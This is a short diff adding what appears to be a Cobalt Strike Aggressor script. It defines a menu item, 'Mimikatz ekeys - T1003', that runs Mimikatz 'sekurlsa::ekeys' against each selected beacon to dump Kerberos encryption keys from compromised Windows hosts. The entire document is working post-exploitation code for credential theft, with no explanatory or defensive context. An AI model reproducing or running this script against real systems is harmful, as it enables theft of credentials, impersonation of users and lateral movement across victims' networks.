@@ -1,0 +1,15 @@
+item "Mimikatz ekeys  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					ekeys($bid);
+				}
+			}
+			
+			
+			
+			
+sub ekeys{
+
+bmimikatz($1, "sekurlsa::ekeys");
+
+}			
